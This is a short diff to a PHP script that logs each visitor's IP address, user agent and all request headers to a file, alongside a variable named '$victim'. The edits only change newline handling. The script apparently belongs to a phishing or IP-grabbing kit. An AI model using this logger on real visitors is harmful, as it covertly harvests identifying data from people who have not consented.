@@ -2,15 +2,15 @@
 
 if (!empty($_SERVER['HTTP_CLIENT_IP']))
     {
-      $ipaddress = $_SERVER['HTTP_CLIENT_IP'].PHP_EOL;
+      $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
     }
 elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
     {
-      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'].PHP_EOL;
+      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
     }
 else
     {
-      $ipaddress = $_SERVER['REMOTE_ADDR'].PHP_EOL;
+      $ipaddress = $_SERVER['REMOTE_ADDR'];
     }
 $useragent = " User-Agent: ";
 $browser = $_SERVER['HTTP_USER_AGENT'];
@@ -23,7 +23,7 @@ $fp = fopen($file, 'a');
 fwrite($fp, $victim);
 fwrite($fp, $ipaddress);
 fwrite($fp, $useragent);
-fwrite($fp, $browser);
+fwrite($fp, $browser . PHP_EOL);
 
 foreach (getallheaders() as $name => $value) {
     fwrite($fp, "$name: $value".PHP_EOL);
